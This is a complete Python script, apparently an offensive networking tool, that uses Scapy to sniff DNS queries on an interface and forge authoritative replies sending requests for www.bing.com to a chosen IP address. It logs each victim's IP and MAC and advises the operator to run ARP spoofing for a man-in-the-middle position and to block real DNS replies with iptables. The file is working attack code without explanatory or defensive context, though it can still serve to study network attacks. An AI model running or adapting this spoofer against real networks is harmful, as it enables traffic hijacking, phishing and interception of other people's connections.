#!/usr/bin/env python3

import argparse,os, sys
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp


# Domain to spoof
target_domain = b"www.bing.com."
# IP to which you want to redirect the victim
spoof_ip = "10.0.2.16"


def check_root():
    if os.geteuid() != 0:
        print("Please run the script as root.")
        sys.exit()


def check_interface_exists(interface):
    """Check if the interface exists on the system."""
    interfaces = os.listdir('/sys/class/net/')
    if interface not in interfaces:
        print("Error: Interface '{}' not present on this system.".format(interface))
        print("Available interfaces: {}".format(', '.join(interfaces)))
        sys.exit(1)


def get_arguments():
    parser = argparse.ArgumentParser()
    # parser = optparse.OptionParser()
    parser.add_argument(dest="interface", help="Interface")
    # parser.add_option("-t", "--target", dest="target", help="Target IP / IP range")
    options = parser.parse_args()
    # (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please Specify Interface, use --help for more info.")
    return options


# Interface to sniff on (adjust as needed)
arguments = get_arguments()
interface = arguments.interface

check_root()
check_interface_exists(interface)


def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname
        if qname == target_domain:
            target_ip = packet[IP].src
            target_mac = scapy.getmacbyip(target_ip)

            if target_mac is None:
                print(f"[-] Could not resolve MAC for {target_ip}. Skipping...")
                return

            print(f"[+] Spoofing DNS response for {qname.decode()}")
            print(f"    → Victim IP: {target_ip}")
            print(f"    → Victim MAC: {target_mac}")
            print(f"    → Redirecting to: {spoof_ip}")

            # Build spoofed DNS response packet
            spoofed_packet = (
                #Ether(dst=target_mac) /
                IP(dst=target_ip, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                DNS(
                    id=packet[DNS].id,
                    qr=1,  # Response
                    aa=1,  # Authoritative Answer
                    qd=packet[DNS].qd,
                    an=DNSRR(rrname=qname, ttl=300, rdata=spoof_ip),
                    ancount=1
                )
            )

            # Send the spoofed packet
            scapy.send(spoofed_packet, iface=interface, verbose=0)
            print("[+] Spoofed packet sent!\n")

print(f"[*] DNS Spoofer started on interface {interface}...\n")
print("[*] Target domain:", target_domain.decode())
print("[*] Spoof IP:", spoof_ip)
print("[!] Make sure you are performing ARP spoofing to be in MITM position.")
print("[!] Consider blocking real DNS responses using iptables if needed.\n")

# Start sniffing
scapy.sniff(filter="udp port 53", iface=interface, prn=dns_spoof, store=False)
